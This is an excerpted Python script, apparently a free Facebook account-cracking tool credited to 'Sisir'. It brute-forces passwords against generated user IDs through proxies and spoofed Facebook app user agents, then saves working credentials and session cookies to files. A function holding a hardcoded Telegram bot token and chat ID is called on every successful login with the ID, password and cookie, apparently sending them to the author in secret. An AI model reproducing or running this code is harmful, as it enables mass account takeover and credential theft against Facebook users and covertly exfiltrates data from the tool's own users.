...
try:
	open('.prox.txt','w').write(requests.get('https://raw.githubercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text)
...
def Elite(ids,pas,cookie):
    try:
        import requests
        token = "6990662911:AAGLNql1SjttXphq4p7OqBXHn9aOI3Fynqk"
        chatid = "6553606623"
...
\033[1;97m--------------------------------------------------
\033[1;97m Author      : Sisir cox
\033[1;97m GitHub      : Sisirr
\033[1;97m Facebook    : Scapegoat sisir
\033[1;97m Version     : 1
\033[1;97m Tool Type   : free
\033[1;97m--------------------------------------------------"""
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Sisro:     
                        clear()
                        id = str(len(user))
                        print('Total account : \033[1;33m'+id)
                        ...
                        for psx in user:
                                ...
                                Sisro.submit(Sisir1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
	...
	clear()
	print('\033[1;37m example: Sisir, ali, sajjad, faizan\033[1;37m')
	linex()
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [Sisir-CP] '+ids+' | '+pas+'\033[1;97m')
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Sisir-OK] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powerSisir = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Sisirramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Sisirramxan};{powerSisir}"
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Sisir-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/Sisir-OK.txt','a').write(ids+'|'+pas+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Sisir-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/196.0.0.61;FBBV/787895399;FBDM/{density=1.5,width=720,height=1280};FBLC/en_IN;FBRV/387109426;FBCR/Personal;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/23073RPBFG;FBSV/13;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
def api4(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [Sisir-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				print('\r\r\033[1;91m [Sisir-CP] '+ids+' | '+pas)
				open('/sdcard/Sisir-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('\r\r\033[1;92m [Sisir-OK] '+ids+' | '+pas+'\033[1;37m')
				open('/sdcard/Sisir-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
				open('/sdcard/Sisir-OK.txt','a').write(ids+'|'+pas+'\n')
				Elite(ids,pas,cookie)
				oks.append(ids)
...
def Sisir1(ids,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Sisir] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
	...
	for pas in passlist:
		try:
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if uid in str(oks):
					break
				print('\r\r\033[1;32m [Sisir-OK] '+uid+' | '+pas+'\033[1;37m')
				oks.append(uid)
				open('/sdcard/Sisir-R-OK.txt','a').write(uid+'|'+pas+'\n')
				break
